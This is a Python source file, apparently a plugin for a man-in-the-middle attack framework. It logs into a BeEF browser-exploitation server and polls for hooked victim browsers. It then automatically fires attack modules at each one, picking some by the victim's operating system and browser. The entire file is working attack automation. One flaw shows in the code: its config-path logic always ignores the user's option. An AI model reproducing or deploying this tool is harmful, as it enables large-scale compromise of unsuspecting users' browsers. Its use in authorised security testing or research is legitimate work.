from plugins.plugin import Plugin
from time import sleep
import sys
import json
import threading
import logging
import libs.beefapi as beefapi

try:
    from configobj import ConfigObj
except:
    sys.exit('[-] configobj library not installed!')

requests_log = logging.getLogger("requests")  #Disables "Starting new HTTP Connection (1)" log message
requests_log.setLevel(logging.WARNING)


class BeefAutorun(Plugin):
	name = "BeEFAutorun"
	optname = "beefauto"
	has_opts = True
	desc = "Autoruns BeEF modules based on Browser or OS type"

	def initialize(self, options):
		self.options = options
		self.autoruncfg = "./config_files/beefautorun.cfg" or options.autoruncfg
		self.beefip = options.beefip
		self.beefport = options.beefport
		self.beefuser = options.beefuser
		self.beefpass = options.beefpass

		beef = beefapi.BeefAPI({"host": self.beefip, "port": self.beefport})
		if beef.login(self.beefuser, self.beefpass):
			print "[*] Successfully logged in to BeEF"
		else:
			sys.exit("[-] Error logging in to BeEF!")

		userconfig = ConfigObj(self.autoruncfg)
		self.Mode = userconfig['mode']
		if self.Mode == 'oneshot':
			print '[*] Setting mode to oneshot'
		elif self.Mode == 'loop':
			print '[*] Setting mode to loop'
		else:
			sys.exit("[-] Error: unrecognized mode set in config file")

		self.All_modules = userconfig["ALL"]
		self.Targeted_modules = userconfig["targets"]

		print "[*] BeEFAutorun plugin online"
		t = threading.Thread(name="autorun", target=self.autorun, args=(beef,))
		t.setDaemon(True)
		t.start()

	def autorun(self, beef):
		already_hooked = []
		already_ran = []
		while True:
			sessions = beef.onlineSessions()
			if (sessions is not None) and (len(sessions) > 0):
				for session in sessions:
					session_ip = beef.session2host(session)
					if session not in already_hooked:
						logging.info("%s >> joined the horde!" % session_ip)
						already_hooked.append(session)

					if self.Mode == 'oneshot':
						if session not in already_ran:
							self.execModules(session, session_ip, beef)
							already_ran.append(session)

					elif self.Mode == 'loop':
						self.execModules(session, session_ip, beef)
						sleep(10)

			else:
				sleep(1)

	def execModules(self, session, session_ip, beef):
		session_browser = beef.sessionInfo(session)["BrowserName"]
		session_os = beef.sessionInfo(session)["OsName"]

		if len(self.All_modules) > 0:
			logging.info("%s >> sending generic modules" % session_ip)
			for module, options in self.All_modules.items():
				mod_id = beef.getModid(module)
				resp = beef.runModule(session, mod_id, json.loads(options))
				if resp["success"] == 'true':
					logging.info('%s >> sent module %s' % (session_ip, mod_id))
				else:
					logging.info('%s >> ERROR sending module %s' % (session_ip, mod_id))
				sleep(0.5)

		logging.info("%s >> sending targeted modules" % session_ip)
		for os in self.Targeted_modules:
			if (os in session_os) or (os == session_os):
				browsers = self.Targeted_modules[os]
				if len(browsers) > 0:
					for browser in browsers:
						if browser == session_browser:
							modules = self.Targeted_modules[os][browser]
							if len(modules) > 0:
								for module, options in modules.items():
									mod_id = beef.getModid(module)
									resp = beef.runModule(session, mod_id, json.loads(options))
									if resp["success"] == 'true':
										logging.info('%s >> sent module %s' % (session_ip, mod_id))
									else:
										logging.info('%s >> ERROR sending module %s' % (session_ip, mod_id))
									sleep(0.5)

	def add_options(self, options):
		options.add_argument('--beefip', dest='beefip', default='127.0.0.1', help="IP of BeEF's server [default: localhost]")
		options.add_argument('--beefport', dest='beefport', default='3000', help="Port of BeEF's server [default: 3000]")
		options.add_argument('--beefuser', dest='beefuser', default='beef', help='Username for beef [default: beef]')
		options.add_argument('--beefpass', dest='beefpass', default='beef', help='Password for beef [default: beef]')
		options.add_argument('--autoruncfg', type=file, help='Specify a config file [default: beefautorun.cfg]')
